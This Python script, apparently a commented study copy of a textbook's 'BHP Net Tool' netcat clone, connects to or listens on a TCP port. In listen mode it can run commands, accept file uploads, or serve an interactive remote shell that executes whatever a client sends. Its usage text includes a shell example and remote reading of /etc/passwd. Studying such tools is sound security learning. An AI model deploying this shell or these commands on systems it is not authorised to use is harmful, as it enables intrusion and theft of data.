# Importing all necessary libraries

import argparse
import shlex
import subprocess
import sys
import textwrap
import threading
import socket


# Function for executing the command of the script
def execute(cmd):

    # Strip the input command of all unecessary characters
    cmd = cmd.strip()

    # If there is no command we will return/ exit
    if not cmd:
        return

    # The ouptput will be returned using the subprocess library, which takes the cmd, which is formated
    # into unix characters/ commands by using shlex, as an input.
    output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
    
    # We return the decoded output
    return output.decode()


# Defining the class NetCat with all the important functionalities
class NetCat():

    # The constructer function takes the arguments and a buffer (and the class itself)
    def __init__(self, args, buffer=None):

        # We initiate the base functions of the object, defined by this class, depending on the input given.
        self.args = args
        self.buffer = buffer
        
        # Initializing a socket utilising the TCP protocol.
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    # The run function checks the for the listen argument, if given we start listening, 
    # otherwise the program is implemented for sending.
    def run(self):
        if self.args.listen:
            self.listen() 
        else:
            self.send()

    # This function is used when the script is run in sending mode
    def send(self):
        # Connect to the target and port
        self.socket.connect((self.args.target, self.args.port))

        # If there is a buffer, we will first send it to the target
        if self.buffer:
            self.socket.send(self.buffer)

        # We utilise a try and except block to stop/ close the connection using CTRL+C 
        try:

            # In this loop we receive the data from the target
            while True:
                recv_len = 1
                response = ''
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()

                    # As soon as we do not receive anymore data (i.e. the data buffer is not completely filled) we break the loop
                    if recv_len < 4096:
                        break

                # If there is a response...
                if response:
                    print(response)
                    # ...we take input and then...
                    buffer = input('> ')
                    buffer += '\n'
                    # ...send the data.
                    self.socket.send(buffer.encode())

        # On KeyboardInterrupt (CTRL+C) we terminate the socket
        except KeyboardInterrupt:
            print('Terminated')
            self.socket.close()
            sys.exit()

    # This function is used when the script is run in listening mode
    def listen(self):
        # Bind to target and port
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)

        # Start listening on the connected socket
        while True:
            client_socket, _ = self.socket.accept()
            client_thread = threading.Thread(
                target = self.handle, args = (client_socket,)
            )
            client_thread.start()

    # The handle function executes the command corresponding to the arguments 
    # (i.e. execute a command, upload a file, create a shell).
    def handle(self, client_socket):

        # If a command should be executed...
        if self.args.execute:
            # ...we execute the command...
            output = execute(self.args.execute)
            # ...and send the output to the client.
            client_socket.send(output.encode())

        # If a file should be uploaded...
        elif self.args.upload:
            # ...we first initiate the buffer...
            file_buffer = b''
            # ...and then run a loop...
            while True:
                # ...in which the received data is added to the file_buffer.
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                else:
                    break

            # We then open the file and write the buffer to it.
            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)
            
            # We send a acknowledgement/ confirmation message, that we succesfully uploaded the file.
            message = f'Saved file {self.args.upload}'
            client_socket.send(message.encode())

        # If a shell should be implemented...
        elif self.args.command:

            # ...we create a command buffer...
            cmd_buffer = b''

            # ...and then enter a loop.
            while True:

                # We then...
                try:
                    # We then wait for a command string, which then is being split up into its commands 
                    # (it is split up by lines - i.e. \n). The \n is used in the send function etc. and
                    # can here be used to symbolize the end of a command/ input.
                    client_socket.send(b'BHP: #>')
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += client_socket.recv(64)
                    
                    # We save the response to the command and send it back.
                    response = execute(cmd_buffer.decode())
                    if response:
                        client_socket.send(response.encode())
                    cmd_buffer = b''

                # ...unless an error is raised. In that case we terminate the connection.
                except Exception as e:
                    print(f'Server killed {e}')
                    self.socket.close()
                    sys.exit()



# If the script is not imported as a library we will execute the following code
if __name__ == '__main__':

    # Creating a parser for the input using the argparser library
    parser = argparse.ArgumentParser(
        description='BHP Net Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,

        # Example of usage
        epilog=textwrap.dedent(
            '''
            Example:
            netcat.py -t 192.168.0.100 -p 6666 # Connect to the specified server
            netcat.py -t 192.168.0.100 -p 6666 -l -c # Yields a command shell
            netcat.py -t 192.168.0.100 -p 6666 -l -u=upload.txt # Upload a file
            netcat.py -t 192.168.0.100 -p 6666 -l -e=\"cat /etc/passwd\" # Executes the given command
            echo 'ABC' | ./netcat.py -t 192.168.0.100 -p 135 # Echo the input to the servers specified port
            '''
        ))

    # Specifying the possible command line arguments
    parser.add_argument('-c', '--command', action='store_true', help='command shell')
    parser.add_argument('-t', '--target', default='192.168.0.225', help='IP of the target')
    parser.add_argument('-p', '--port', default=6666, help='Target port')
    parser.add_argument('-l', '--listen', action='store_true', help='Listen')
    parser.add_argument('-u', '--upload', help='Upload a file')
    parser.add_argument('-e', '--execute', help='Exectue a given command')
        
    args = parser.parse_args()

    if args.listen:
        buffer = ''
    else:
        buffer = sys.stdin.read()

    nc = NetCat(args, buffer.encode())
    nc.run()

    